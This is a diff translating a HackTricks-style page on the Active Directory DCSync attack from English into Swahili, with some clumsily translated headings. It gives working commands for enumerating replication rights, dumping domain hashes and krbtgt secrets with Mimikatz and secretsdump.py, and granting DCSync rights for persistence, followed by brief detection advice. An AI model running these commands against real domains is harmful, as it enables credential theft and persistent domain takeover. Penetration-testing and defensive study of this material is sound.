@@ -3,8 +3,8 @@
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) kujenga na **kujiendesha kiotomatiki** kazi zinazotolewa na zana za jamii **zilizoendelea zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
 
@@ -12,67 +12,57 @@ Get Access Today:
 
 ## DCSync
 
-The **DCSync** permission implies having these permissions over the domain itself: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** and **Replicating Directory Changes In Filtered Set**.
+Ruhusa ya **DCSync** inamaanisha kuwa na ruhusa hizi juu ya eneo lenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.
 
-**Important Notes about DCSync:**
+**Maelezo Muhimu Kuhusu DCSync:**
 
-- The **DCSync attack simulates the behavior of a Domain Controller and asks other Domain Controllers to replicate information** using the Directory Replication Service Remote Protocol (MS-DRSR). Because MS-DRSR is a valid and necessary function of Active Directory, it cannot be turned off or disabled.
-- By default only **Domain Admins, Enterprise Admins, Administrators, and Domain Controllers** groups have the required privileges.
-- If any account passwords are stored with reversible encryption, an option is available in Mimikatz to return the password in clear text
+- **Shambulio la DCSync linaiga tabia ya Kidhibiti cha Eneo na linaomba Kidhibiti kingine cha Eneo kuiga taarifa** kwa kutumia Protocol ya Huduma ya Kuiga Katalogi ya Mbali (MS-DRSR). Kwa sababu MS-DRSR ni kazi halali na muhimu ya Active Directory, haiwezi kuzuiwa au kuzimwa.
+- Kwa kawaida, tu vikundi vya **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** vina ruhusa zinazohitajika.
+- Ikiwa nywila za akaunti yoyote zimehifadhiwa kwa usimbaji wa kurudiwa, chaguo linapatikana katika Mimikatz kurudisha nywila hiyo kwa maandiko wazi.
 
 ### Enumeration
 
-Check who has these permissions using `powerview`:
-
+Angalia ni nani ana ruhusa hizi kwa kutumia `powerview`:
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
-
-### Exploit Locally
-
+### Fanya Uhalifu Kwenye Kihisia
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
-
-### Exploit Remotely
-
+### Fanya Uhalifu kwa Mbali
 ```powershell
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-just-dc-user <USERNAME>] #To get only of that user
 [-pwd-last-set] #To see when each account's password was last changed
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
+`-just-dc` inazalisha faili 3:
 
-`-just-dc` generates 3 files:
+- moja ikiwa na **NTLM hashes**
+- moja ikiwa na **Kerberos keys**
+- moja ikiwa na nywila za wazi kutoka NTDS kwa akaunti zozote zilizowekwa na [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) iliyowezeshwa. Unaweza kupata watumiaji wenye reversible encryption kwa
 
-- one with the **NTLM hashes**
-- one with the the **Kerberos keys**
-- one with cleartext passwords from the NTDS for any accounts set with [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) enabled. You can get users with reversible encryption with
-
-  ```powershell
-  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
-  ```
+```powershell
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+```
 
 ### Persistence
 
-If you are a domain admin, you can grant this permissions to any user with the help of `powerview`:
-
+Ikiwa wewe ni admin wa domain, unaweza kutoa ruhusa hii kwa mtumiaji yeyote kwa msaada wa `powerview`:
 ```powershell
 Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
 ```
-
-Then, you can **check if the user was correctly assigned** the 3 privileges looking for them in the output of (you should be able to see the names of the privileges inside the "ObjectType" field):
-
+Kisha, unaweza **kuangalia kama mtumiaji amepewa** haki 3 kwa kutafuta katika matokeo ya (unapaswa kuwa na uwezo wa kuona majina ya haki ndani ya uwanja wa "ObjectType"):
 ```powershell
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
 ```
-
 ### Mitigation
 
-- Security Event ID 4662 (Audit Policy for object must be enabled) – An operation was performed on an object
-- Security Event ID 5136 (Audit Policy for object must be enabled) – A directory service object was modified
-- Security Event ID 4670 (Audit Policy for object must be enabled) – Permissions on an object were changed
-- AD ACL Scanner - Create and compare create reports of ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+- Security Event ID 4662 (Audit Policy for object must be enabled) – Operesheni ilifanyika kwenye kitu
+- Security Event ID 5136 (Audit Policy for object must be enabled) – Kitu cha huduma ya directory kilibadilishwa
+- Security Event ID 4670 (Audit Policy for object must be enabled) – Ruhusa kwenye kitu zilibadilishwa
+- AD ACL Scanner - Unda na kulinganisha ripoti za ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## References
 
@@ -84,8 +74,7 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 <figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Tumia [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) kujenga na **kujiendesha** kwa urahisi kazi zinazotolewa na zana za jamii **za kisasa zaidi** duniani.\
+Pata Ufikiaji Leo:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
-
